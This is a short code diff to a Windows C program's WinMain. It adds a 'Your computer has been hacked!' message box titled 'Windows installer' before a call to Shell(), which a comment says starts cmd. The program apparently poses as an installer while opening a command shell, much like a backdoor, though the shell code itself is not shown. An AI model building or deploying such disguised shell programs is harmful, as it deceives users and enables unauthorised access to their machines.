@@ -159,5 +159,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 			break;
 		}
 	}
-	Shell();
+	MessageBox(NULL, TEXT("Your computer has been hacked!"), TEXT("Windows installer"), MB_OK | MB_ICONERROR); // spooky message lol
+	Shell(); // initializes windows cmd
 }
